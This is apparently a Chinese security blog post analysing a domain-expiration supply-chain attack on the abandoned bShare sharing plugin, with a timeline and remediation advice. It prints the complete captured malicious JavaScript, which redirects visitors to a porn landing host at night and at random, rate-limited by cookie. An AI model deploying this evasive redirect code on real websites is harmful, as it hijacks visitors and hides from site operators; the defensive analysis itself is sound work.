---
title: bshare 域名过期抢注事件
url: https://mp.weixin.qq.com/s/el8kgTrBRFM4VczpXDP15A
source: Doonsec's feed
date: 2026-06-18
fetch_date: 2026-06-19T07:05:16.142082
---

# bshare 域名过期抢注事件

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/2xCpgJcagfichiaZSib0qygjA3bcibhichosTYC2libBqUnibPRg16F3HiaSb3cH9FsSZaneCZktn7fvTBia9mzK1YFL3eyq3VEEeTtjO21tnISHJq54/0?wx_fmt=jpeg)

# bshare 域名过期抢注事件

松杨云创
松杨云创

松杨网络安全资料库

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

### 一、前言

某次安全巡检中，发现一个正常运营的网站存在异常行为：页面加载后有一定概率跳转至色情网站。起初以为是被入侵后挂马，但检查服务器文件后发现一切正常——问题出在一个第三方引用脚本上。

该 JS 文件名为 `bshareCO.js`，属于曾经非常流行的网页社交分享插件 **bShare**。而后续调查发现，这并非一起孤立的服务器入侵事件，而是一场**域名过期抢注型供应链攻击**。

### 二、恶意代码实测分析

以下是本次巡查中实际捕获的恶意代码完整内容：

```
var _hmt = _hmt || [];
(function() {
var hm = document.createElement("script");
 hm.src = "https://hm.baidu.com/hm.js?ee2c4c13bbf7dc7819d47f718a7d2e80";
var s = document.getElementsByTagName("script")[0];
 s.parentNode.insertBefore(hm, s);
})();

(function() {
const COOKIE_NAME = 'last_redirect_time';
const REDIRECT_URL = 'https://20sj.bjebxgi.cn?bs';

function getCookie(name) {
const value = `; ${document.cookie}`;
const parts = value.split(`; ${name}=`);
if (parts.length === 2) return parts.pop().split(';').shift();
return null;
 }

function set12HourCookie(name, value) {
const date = new Date();
 date.setTime(date.getTime() + (12 * 60 * 60 * 1000));
document.cookie = `${name}=${value}; expires=${date.toUTCString()}; path=/`;
 }

function getBeijingHour() {
return parseInt(new Intl.DateTimeFormat('en-US', {
timeZone: 'Asia/Shanghai',
hour: 'numeric',
hour12: false
 }).format(new Date()));
 }

if (getCookie(COOKIE_NAME)) {
return;
 }

const currentHour = getBeijingHour();
let shouldRedirect = false;

if (currentHour >= 19 || currentHour < 6) {
 shouldRedirect = true;
 } else {
if (Math.random() < 0.3) {
 shouldRedirect = true;
 }
 }

if (shouldRedirect) {
set12HourCookie(COOKIE_NAME, 'true');
window.location.href = REDIRECT_URL;
 }
})();
```

代码结构清晰，分为两个部分：

**Part 1 — 百度统计（伪装层）**

注入一段合法的百度统计代码。该 HM 账号并非网站运营方的，而是攻击者自行申请的。其用途有二：一是让脚本看起来像正常的统计代码，降低管理员检查时的警觉；二是监控受害流量——哪些页面触发了跳转、访客来源、设备信息等，为黑产做数据运营。

**Part 2 — 条件跳转逻辑**

攻击者设计了一套精细的触发策略：

* **北京时间精准判定**：使用 `Intl.DateTimeFormat` 获取北京时间小时值，而非客户端本地时间（用户的手机可能在不按时区），确保攻击窗口精确
* **夜间全量**：19:00 至次日 06:00，触发概率极高（管理员大概率离线）
* **日间抽样**：06:00 至 19:00，随机触发（降低暴露风险，减少投诉）
* **Cookie 限频**：同一浏览器 12 小时内最多触发一次，避免连续跳转引起用户警觉
* **最终指向**：`https://20sj.bjebxgi.cn?bs`，`bjebxgi.cn` 是典型的随机字母组合域名，`?bs` 参数极大概率是流量来源标记，用于黑产结算分佣

### 三、溯源：不是被入侵，是被抢注

初步分析时，判断方向是"攻击者通过漏洞拿到了服务器写入权限，直接篡改了 bshareCO.js"。但威胁情报平台查询结果显示，该域名仍在**白名单**内——一个信誉分极高、历史清白的域名突然开始推送恶意脚本，这不符合服务器被入侵的特征。

经进一步调查，还原了完整的时间链：

| 时间 | 事件 |
| --- | --- |
| 2018 年 2 月 | bShare 运营公司（擘纳（上海）信息科技有限公司）注销 |
| 2023 年 9 月 | bshare.cn ICP 备案最后一次可查 |
| 2024 年 10 月 | **bshare.cn 域名过期** |
| 2024 年 11 月 | 域名状态从 OK 变为 clientHold（锁定状态） |
| 2024 年 12 月 | 首次发现利用该域名的推流和钓鱼活动 |
| 2025 年 2 月 | 安全厂商大规模检测到异常跳转 |
| 2025 年 9 月 | 安全社区公开披露分析报告 |
| 至今（2026 年 6 月） | 大量网站仍未移除引用代码 |

**攻击链**：

```
站长引入分享组件 → <script src="http://static.bshare.cn/b/bshareC0.js">
                              ↓
                域名到期 → 攻击者抢注 static.bshare.cn
                              ↓
                替换 JS 文件内容 → 全量引用该域名的网站同时受害
```

这是一个非常典型的**域名过期抢注型供应链攻击（Domain Expiration Hijacking）**。攻击者在域名正常过期后将其重新注册，在自有服务器上托管恶意 JS 文件，无需入侵任何目标服务器，即可控制所有加载该 JS 的网页。

需要注意这里的两层域名分工：

* **`static.bshare.cn`** —— 被抢注的域名，充当恶意 JS 的**分发入口**。只要网页里有引用它的 `<script>` 标签，就会执行攻击者控制的脚本
* **`20sj.bjebxgi.cn`** —— JS 执行后的**跳转目标**，即色情推流落地页，属于随时可更换的变现终端

证据在于，安全厂商捕获的早期样本中跳转域名还是 `360bs.julupan.com`，而本次实测已换成了 `bjebxgi.cn`。变现层可以随时迭代，但分发入口（bshare）的抢注是不可逆的——谁拿到了这个域名，谁就持续持有这个流量入口。

### 四、未被有效遏制原因

**1. 条件触发躲避自动化检测**

恶意代码对触发条件做了精细筛选——只有在夜间特定时段才会全量跳转，白天仅在随机命中时触发。大多数自动化安全爬虫在日间运行、采样窗口有限，很难抓到偶发跳转行为。

**2. 组件废弃 ≠ 自动下线**

bShare 分享插件早已停止维护，域名在 2024 年 10 月之后实际上已不可用。但引用代码是静态写入 HTML 的，不会因为域名过期而自动删除。只要没人手动去改，它就永远留在页面上。

**3. 攻击者持续迭代**

| 特征 | 早期样本 | 本次捕获 |
| --- | --- | --- |
| 跳转域名 | `360bs.julupan.com` | `20sj.bjebxgi.cn` |
| 触发时段 | 21:00 ~ 05:00 | 19:00 ~ 06:00 |
| Cookie 限频 | 24 小时 | 12 小时 |
| UA 检测 | 仅 Android 移动端 | 不限设备 |
| 日间触发 | 不触发 | 随机触发 |

域名不断更换、时段范围扩大、限频策略调整——攻击者表现出了相当成熟的运营能力，远非一次性投放后就不管了。

### 五、影响面评估

根据安全社区发布的数据，受影响网站超数千家，且这还不包括二级目录页面。

### 六、处置建议

**1. 全站排查外部引用**

搜索页面源码中所有 `<script src="...">` 标签，排查以下几类高风险组件：

* bshare / bdshare 分享插件
* jiathis 等已停止维护的社交分享组件
* 第三方 CDN 引入的 jQuery、Bootstrap 等库的冷门镜像域名

**2. 移除或替换**

对于确认不受控的外部 JS 引用，直接删除对应标签，或将其替换为本地托管的静态文件。

**3. 引入 SRI（子资源完整性校验）**

对新增或替换的必须保留的外部 JS 资源添加 `integrity` 属性。即使域名被劫持，浏览器也会因为哈希不匹配而拒绝执行被篡改的脚本。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/n3sKsNaia7UAicqBXkY6PekQB9TvES6wdib3Tunt6tg5AEAXILtr3peiatYdFs6Nwy0flHMTxxFOT5ibm10zY6tw1gQ/0?wx_fmt=png)

松杨网络安全资料库

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/n3sKsNaia7UAicqBXkY6PekQB9TvES6wdib3Tunt6tg5AEAXILtr3peiatYdFs6Nwy0flHMTxxFOT5ibm10zY6tw1gQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过